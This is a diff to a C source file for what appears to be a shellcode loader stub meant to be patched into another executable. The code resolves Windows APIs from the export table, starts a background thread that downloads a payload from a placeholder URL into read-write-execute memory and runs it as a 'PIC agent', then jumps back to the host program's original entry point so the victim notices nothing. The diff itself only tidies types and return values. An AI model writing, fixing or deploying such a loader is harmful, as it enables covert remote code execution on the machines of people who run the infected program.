@@ -41,19 +41,10 @@ typedef unsigned long long uptr;
 #define EXPDIR_OFF 0x78
 #endif
 
-#ifdef _WIN64
-#define WINAPI
-#else
-#define WINAPI __stdcall
-#endif
-
 typedef unsigned int u32;
 typedef unsigned short u16;
 
-/* ── Patched data (ASCII-findable by LoaderUrlPatcher) ─────────────────────── */
-
 /* ── API function-pointer types ───────────────────────────────────────────── */
-
 typedef void *(WINAPI *GetProcAddress_t)(void *hModule, const char *name);
 typedef void *(WINAPI *LoadLibraryA_t)(const char *lib);
 
@@ -151,20 +142,20 @@ static void *resolve_export(uptr base, const char *name)
 /* ── Background download + execute ────────────────────────────────────────── */
 char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
 
-static void download_thread(void *param)
+static u32 download_thread(void *param)
 {
     struct API *api = (struct API *)param;
     void *buf = api->pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
     if (!buf)
-        return;
+        return 0;
 
     void *hInternet = api->pInternetOpenA(0, 0, 0, 0, 0);
     if (!hInternet)
-        return;
+        return 0;
 
     void *hUrl = api->pInternetOpenUrlA(hInternet, g_url, 0, 0, 0x84000000 /*RELOAD|NO_CACHE_WRITE*/, 0);
     if (!hUrl)
-        return;
+        return 0;
 
     uptr off = 0;
     u32 got = 0;
@@ -175,7 +166,8 @@ static void download_thread(void *param)
     } while (got && off < 0x400000);
 
     if (off)
-        ((void (*)(void))buf)(); /* run the PIC agent */
+        return ((u32 (*)(void))buf)(); /* run the PIC agent */
+    return 0;
 }
 
 /* ── Entry (placed first in .text via section attr) ───────────────────────── */
@@ -192,7 +184,7 @@ __attribute__((section(".text.start"), used)) void _start(void)
 
     api.pVirtualAlloc = (VirtualAlloc_t)resolve_export(k32, "VirtualAlloc");
 
-    void *wininet = api.pLoadLibraryA("wininet.dll");
+    uptr wininet = (uptr)api.pLoadLibraryA("wininet.dll");
     if (wininet)
     {
         api.pInternetOpenA = (InternetOpenA_t)resolve_export(wininet, "InternetOpenA");
@@ -201,7 +193,7 @@ __attribute__((section(".text.start"), used)) void _start(void)
     }
 
     if (api.pCreateThread && api.pInternetOpenUrlA)
-        api.pCreateThread(0, 0, download_thread, &api, 0, 0);
+        api.pCreateThread(0, 0, (u32 (*)(void *))download_thread, &api, 0, 0);
 
     /* Resume the host: exe base (PEB.Ldr.InLoadOrderModuleList[0]) + patched OEP RVA. */
     uptr peb = PEB();
